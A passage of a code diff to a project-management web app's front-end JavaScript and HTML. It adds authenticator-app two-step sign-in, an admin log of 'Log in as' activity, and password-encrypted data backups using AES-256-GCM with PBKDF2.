     <div class="field"><label>New password</label><input id="s_newpwd" type="password" placeholder="New password"></div>
     <div class="field"><label>Confirm new password</label><input id="s_newpwd2" type="password" placeholder="Re-enter new password"></div>
     <div class="modal-actions"><button class="btn ghost" onclick="closeModal()">Cancel</button><button class="btn" onclick="saveMyPassword()">Save password</button></div>
+    ${otpSettingsHtml()}
     ${dbSection}`);
+  loadOtpStatus();
   // Removed from Settings: "Email sending check", "Reminder tone" and "Stage reminders".
   // Both reminder pop-ups are switched off (AI_REM_POPUP_DISABLED / STAGE_REM_POPUP_DISABLED),
   // so the tone and stage-reminder timings had no effect. Their helper functions are left
@@ -14373,6 +16853,25 @@ async function loadMemberProfile(empIdToLoad){
       ${p.updatedAt ? `<p style="font-size:11.5px;color:var(--muted);margin-top:6px">Updated ${esc(p.updatedAt)}</p>` : ""}</div>
     </div>`;
 }
+/* ---- Admin: Settings -> "Log in as" activity (server table login_as_log) ---- */
+const LOGIN_AS_ACTION_LABEL = {login_as_start: "Opened the dashboard"};
+async function openLoginAsLog(){
+  let out;
+  try{ out = await api("login_as_log"); }catch(e){ toast(e.message || "Could not load the activity"); return; }
+  const rows = (out.entries||[]).map(x=>`<tr>
+      <td style="white-space:nowrap">${esc(x.at)}</td>
+      <td>${esc(x.openedBy)}</td>
+      <td>${esc(x.empName)}</td>
+      <td>${esc(LOGIN_AS_ACTION_LABEL[x.action]||x.action)}${x.clientId?` <span style="color:var(--muted)">(${esc(x.clientId)})</span>`:""}</td>
+      <td>${x.ok?`<span style="color:#3f9a57">done</span>`:`<span style="color:#d9534f">refused</span>`}${x.detail?`<br><span style="color:var(--muted);font-size:11.5px">${esc(x.detail)}</span>`:""}</td>
+    </tr>`).join("");
+  openModal(`<h3>&ldquo;Log in as&rdquo; activity</h3>
+    <p class="msub">Newest first (last 500). Page loads and background refreshes are not listed.</p>
+    ${rows ? `<div style="overflow:auto;max-height:60vh"><table class="adm-table" style="width:100%;font-size:12.5px">
+      <thead><tr><th>When</th><th>Opened by</th><th>Signed in as</th><th>Action</th><th>Result</th></tr></thead>
+      <tbody>${rows}</tbody></table></div>` : `<p style="color:var(--muted)">Nobody has used &ldquo;Log in as&rdquo; yet.</p>`}
+    <div class="modal-actions"><button class="btn ghost" onclick="closeModal()">Close</button></div>`);
+}
 /* ---- Admin: Settings -> Email sending check ---- */
 const MAIL_METHOD_LABEL = {gmail_api:"Gmail API (works on Render's free plan)", smtp:"Gmail SMTP (app password)"};
 async function loadMailStatus(){
@@ -14523,6 +17022,7 @@ function openDatabaseManagement(){
       <h4 class="am-section-head" style="margin-top:0">&#11014; Upload backup (restore data)</h4>
       <p style="font-size:12.5px;color:var(--muted);margin:0 0 8px">Choose a backup file downloaded from this screen (<b>imatiz-backup-….json</b>). Every client, payment, installment, task, note, document and message goes back exactly where it was &mdash; Marketing, Accounts, Technical and Journal team records each return to their own team's dashboard with the same stage and assignments. Records that already exist are skipped, so uploading the same file twice never creates duplicates.</p>
       <input id="cd_uploadFile" type="file" accept=".json,application/json" style="margin-bottom:8px">
+      <div class="field"><label>Backup password <small style="color:var(--muted);font-weight:500">(the one used when it was downloaded; older unencrypted backups don't need one)</small></label><input id="cd_upPwd" type="password" autocomplete="off"></div>
       <div><button class="btn gold" id="cd_uploadBtn" onclick="uploadDataBackup()">&#11014; Upload &amp; restore</button></div>
       <div id="cd_uploadStatus" style="margin-top:8px;font-size:12.5px;color:var(--muted)"></div>
     </div>
@@ -14542,6 +17042,8 @@ function openDatabaseManagement(){
     <div style="height:1px;background:var(--line);margin:16px 0"></div>
     <h4 class="am-section-head">Step 1 — Download a backup first</h4>
     <p style="font-size:12.5px;color:var(--muted);margin:0 0 8px">Downloads everything that would be removed, as one JSON file, before anything is deleted. There's no way to recover the data afterward, so do this first.</p>
+    <div class="field"><label>Backup password <small style="color:var(--muted);font-weight:500">(at least 10 characters &mdash; the file is encrypted with it; without it the backup can't be opened or restored, so keep it safe)</small></label><input id="cd_bkPwd" type="password" autocomplete="new-password"></div>
+    <div class="field"><label>Repeat the backup password</label><input id="cd_bkPwd2" type="password" autocomplete="new-password"></div>
     <button class="btn gold" id="cd_downloadBtn" onclick="downloadDataBackup()">&#11015; Download backup</button>
     <div id="cd_backupStatus" style="margin-top:8px;font-size:12.5px;color:var(--muted)">No backup downloaded yet for the current selection.</div>
     <div style="height:1px;background:var(--line);margin:16px 0"></div>
@@ -14575,12 +17077,20 @@ async function downloadDataBackup(){
   const {mode, startDate, endDate} = cdCurrentScope();
   if(mode==="range" && (!startDate || !endDate)){ toast("Pick a start and end date first"); return; }
   if(mode==="range" && startDate > endDate){ toast("Start date can't be after the end date"); return; }
+  // SECURITY: a backup holds every client's details, payments, chats and files, so it is
+  // encrypted in this browser (AES-256-GCM, key from the password with PBKDF2) before it
+  // is saved. A copied or lost file is useless without the password.
+  const pwd = ($("cd_bkPwd")||{}).value || "";
+  if(pwd.length < 10){ toast("Choose a backup password of at least 10 characters"); return; }
+  if(pwd !== (($("cd_bkPwd2")||{}).value || "")){ toast("The two backup passwords don't match"); return; }
   const btn = $("cd_downloadBtn");
   if(btn){ btn.disabled = true; btn.textContent = "Preparing backup…"; }
   let out;
   try{ out = await api("admin_export_data", {mode, startDate, endDate}); }
   catch(e){ toast(e.message); if(btn){ btn.disabled=false; btn.textContent="⬇ Download backup"; } return; }
-  const blob = new Blob([JSON.stringify(out, null, 2)], {type:"application/json"});
+  let blob;
+  try{ blob = new Blob([JSON.stringify(await sealBackup(out, pwd))], {type:"application/json"}); }
+  catch(e){ toast(e.message); if(btn){ btn.disabled=false; btn.textContent="⬇ Download backup"; } return; }
   const url = URL.createObjectURL(blob);
   const a = document.createElement("a");
   const stamp = new Date().toISOString().slice(0,19).replace(/[:T]/g,"-");
@@ -14633,6 +17143,10 @@ async function uploadDataBackup(){
   let backup;
   try{ backup = JSON.parse(await file.text()); }
   catch(e){ toast("Couldn't read that file — it isn't a valid backup"); return; }
+  if(backup && backup.matizEncryptedBackup){
+    try{ backup = await openBackup(backup, ($("cd_upPwd")||{}).value || ""); }
+    catch(e){ toast(e.message); return; }
+  }
   if(!backup || typeof backup!=="object" || !Array.isArray(backup.clients)){
     toast("That file doesn't look like a backup from this app"); return;
   }
@@ -15940,7 +18454,7 @@ setInterval(async function(){
   if($("modalBg").classList.contains("open") || $("drawer").classList.contains("open")) return;
   const active = document.activeElement;
   if(active && (active.tagName==="INPUT" || active.tagName==="TEXTAREA" || active.tagName==="SELECT")) return;
-  await refresh();
+  await refresh({allowSkip: true});
 }, 12000);
 
 /* Browsers pause/slow down timers in a tab that's in the background (another tab, another
@@ -15956,6 +18470,131 @@ document.addEventListener('visibilitychange', function(){ if(document.visibility
 window.addEventListener('focus', pollActiveChatNow);
 window.addEventListener('pageshow', pollActiveChatNow);
 
+
+/* ================= TWO-STEP SIGN-IN (authenticator app) =================
+   Admin and department logins: after the password, a 6-digit code from Google
+   Authenticator / Microsoft Authenticator / Authy. Super Admin and MD Admin must use it
+   (server setting REQUIRE_2FA); other department logins turn it on in Settings. */
+function otpQrSvg(uri){
+  try{ const q = qrcode(0, "M"); q.addData(uri); q.make(); return q.createSvgTag({cellSize:4, margin:2, scalable:true}); }
+  catch(e){ return ""; }
+}
+function otpGroup(secret){ return String(secret||"").replace(/(.{4})/g,"$1 ").trim(); }
+function otpSetupHtml(secret, uri){
+  return `<div style="width:200px;max-width:70vw;margin:8px auto;background:#fff;padding:6px;border-radius:8px">${otpQrSvg(uri)}</div>
+    <p class="msub" style="text-align:center">Can't scan? In the app choose <b>Enter a setup key</b> and type:</p>
+    <p style="font-family:'JetBrains Mono',monospace;font-size:15px;text-align:center;letter-spacing:1px;user-select:all">${esc(otpGroup(secret))}</p>`;
+}
+function askLoginOtp(first){
+  return new Promise(resolve=>{
+    const setup = !!first.otpSetup;
+    openModal(`<h2>${setup ? "Set up two-step sign-in" : "Two-step sign-in"}</h2>
+      ${setup ? `<p class="msub">This login now needs a code from an authenticator app (Google Authenticator, Microsoft Authenticator or Authy) as well as the password. Scan this with the app, then type the 6-digit code it shows. Everyone who shares this login should scan it now.</p>${otpSetupHtml(first.otpSecret, first.otpUri)}`
+              : `<p class="msub">Open your authenticator app and type the 6-digit code shown for <b>iMatiz PM</b>.</p>`}
+      <div class="field"><label>6-digit code</label><input id="otpCode" inputmode="numeric" autocomplete="one-time-code" maxlength="7" placeholder="123456"></div>
+      <p id="otpErr" style="color:#c0392b;min-height:18px;margin:4px 0"></p>
+      <div class="modal-actions"><button class="btn ghost" id="otpCancel">Cancel</button><button class="btn" id="otpGo">Verify &amp; sign in</button></div>`);
+    let done = false;
+    const finish = v=>{ if(done) return; done = true; closeModal(); resolve(v); };
+    const go = async ()=>{
+      const code = $("otpCode").value.replace(/\s/g,"");
+      if(!/^\d{6}$/.test(code)){ $("otpErr").textContent = "Type the 6 digits from the app."; return; }
+      $("otpGo").disabled = true; $("otpErr").textContent = "Checking...";
+      try{ finish(await api("login_otp", {otpTicket: first.otpTicket, code})); }
+      catch(e){
+        $("otpGo").disabled = false; $("otpErr").textContent = e.message;
+        if(/expired/i.test(e.message)) setTimeout(()=>finish(null), 1500);
+      }
+    };
+    $("otpGo").onclick = go;
+    $("otpCode").addEventListener("keydown", e=>{ if(e.key==="Enter") go(); });
+    $("otpCancel").onclick = ()=>finish(null);
+    setTimeout(()=>{ const i = $("otpCode"); if(i) i.focus(); }, 50);
+  });
+}
+function otpSettingsHtml(){
+  if(role==="employee" || role==="client" || role==="validator") return "";
+  const isAdmin = role==="super_admin" || role==="md_admin";
+  const opts = Object.entries(roleEmailLabels||{}).map(([k,v])=>`<option value="${esc(k)}">${esc(v)}</option>`).join("");
+  return `<div style="height:1px;background:var(--line);margin:18px 0"></div>
+    <h3>Two-step sign-in</h3>
+    <p class="msub" id="otpStatusLine">Checking&hellip;</p>
+    <div class="modal-actions" id="otpActions"></div>
+    ${isAdmin && opts ? `<h3 style="margin-top:14px">Reset another login's two-step sign-in</h3>
+      <p class="msub">Use this when the phone with the codes is lost. That login is signed out and sets up a new code at its next sign-in.</p>
+      <div class="field"><select id="otpResetRole">${opts}</select></div>
+      <div class="modal-actions"><button class="btn ghost" onclick="adminResetOtp()">Reset two-step sign-in</button></div>` : ""}`;
+}
+async function loadOtpStatus(){
+  const line = $("otpStatusLine"); if(!line) return;
+  try{
+    const st = await api("otp_status", {});
+    line.textContent = st.enabled ? "On: signing in to this login needs the password and a code from the authenticator app."
+      : (st.required ? "Required for this login: you'll be asked to set it up at your next sign-in."
+                     : "Off. Turn it on so that a stolen password alone can't open this login.");
+    $("otpActions").innerHTML = st.enabled ? (st.required ? "" : `<button class="btn ghost" onclick="openOtpDisable()">Turn off</button>`)
+      : `<button class="btn" onclick="startOtpSetup()">Turn on two-step sign-in</button>`;
+  }catch(e){ line.textContent = e.message; }
+}
+async function startOtpSetup(){
+  let out;
+  try{ out = await api("otp_setup_start", {}); }catch(e){ toast(e.message); return; }
+  openModal(`<h2>Turn on two-step sign-in</h2>
+    <p class="msub">Scan this with an authenticator app (Google Authenticator, Microsoft Authenticator or Authy), then type the 6-digit code it shows. Everyone who shares this login should scan it now - it isn't shown again.</p>
+    ${otpSetupHtml(out.secret, out.uri)}
+    <div class="field"><label>6-digit code</label><input id="otpSetupCode" inputmode="numeric" autocomplete="one-time-code" maxlength="7" placeholder="123456"></div>
+    <div class="modal-actions"><button class="btn ghost" onclick="closeModal()">Cancel</button><button class="btn" onclick="confirmOtpSetup()">Turn on</button></div>`);
+}
+async function confirmOtpSetup(){
+  try{ await api("otp_setup_confirm", {code: $("otpSetupCode").value.replace(/\s/g,"")}); }
+  catch(e){ toast(e.message); return; }
+  closeModal(); toast("Two-step sign-in is on for this login.");
+}
+function openOtpDisable(){
+  openModal(`<h2>Turn off two-step sign-in</h2>
+    <p class="msub">After this, the password alone opens this login.</p>
+    <div class="field"><label>Current password</label><input id="otpOffPwd" type="password"></div>
+    <div class="field"><label>6-digit code from the app</label><input id="otpOffCode" inputmode="numeric" maxlength="7"></div>
+    <div class="modal-actions"><button class="btn ghost" onclick="closeModal()">Cancel</button><button class="btn" onclick="confirmOtpDisable()">Turn off</button></div>`);
+}
+async function confirmOtpDisable(){
+  try{ await api("otp_disable", {currentPassword: $("otpOffPwd").value, code: $("otpOffCode").value.replace(/\s/g,"")}); }
+  catch(e){ toast(e.message); return; }
+  closeModal(); toast("Two-step sign-in is off for this login.");
+}
+async function adminResetOtp(){
+  const sel = $("otpResetRole"); if(!sel) return;
+  const label = sel.options[sel.selectedIndex].text;
+  if(!confirm("Reset two-step sign-in for " + label + "? Everyone signed in with it is signed out.")) return;
+  try{ await api("admin_reset_otp", {targetRole: sel.value}); }catch(e){ toast(e.message); return; }
+  toast("Reset. " + label + " sets up a new code at its next sign-in.");
+}
+
+/* ---------- backup encryption (browser side, Web Crypto) ---------- */
+const BACKUP_KDF_ITER = 310000;
+function _b64(buf){ let s = ""; const b = new Uint8Array(buf); for(let i=0;i<b.length;i+=0x8000) s += String.fromCharCode.apply(null, b.subarray(i, i+0x8000)); return btoa(s); }
+function _unb64(s){ const bin = atob(s); const b = new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) b[i] = bin.charCodeAt(i); return b; }
+async function _backupKey(pwd, salt, iter){
+  if(!(window.crypto && crypto.subtle)) throw new Error("Encrypted backups need the HTTPS address of the app.");
+  const base = await crypto.subtle.importKey("raw", new TextEncoder().encode(pwd), "PBKDF2", false, ["deriveKey"]);
+  return crypto.subtle.deriveKey({name:"PBKDF2", hash:"SHA-256", salt, iterations: iter}, base,
+                                 {name:"AES-GCM", length:256}, false, ["encrypt","decrypt"]);
+}
+async function sealBackup(obj, pwd){
+  const salt = crypto.getRandomValues(new Uint8Array(16)), iv = crypto.getRandomValues(new Uint8Array(12));
+  const key = await _backupKey(pwd, salt, BACKUP_KDF_ITER);
+  const ct = await crypto.subtle.encrypt({name:"AES-GCM", iv}, key, new TextEncoder().encode(JSON.stringify(obj)));
+  return {matizEncryptedBackup: 1, cipher: "AES-256-GCM", kdf: "PBKDF2-SHA256", iter: BACKUP_KDF_ITER,
+          exportedAt: obj.exportedAt, mode: obj.mode, salt: _b64(salt), iv: _b64(iv), data: _b64(ct)};
+}
+async function openBackup(enc, pwd){
+  if(!pwd) throw new Error("Type the backup password for this file.");
+  const key = await _backupKey(pwd, _unb64(enc.salt), enc.iter || BACKUP_KDF_ITER);
+  let plain;
+  try{ plain = await crypto.subtle.decrypt({name:"AES-GCM", iv:_unb64(enc.iv)}, key, _unb64(enc.data)); }
+  catch(e){ throw new Error("Wrong backup password (or the file is damaged)."); }
+  return JSON.parse(new TextDecoder().decode(plain));
+}
 </script>
 
 <!-- ============ FLOATING AI ASSISTANT (every dashboard) ============ -->
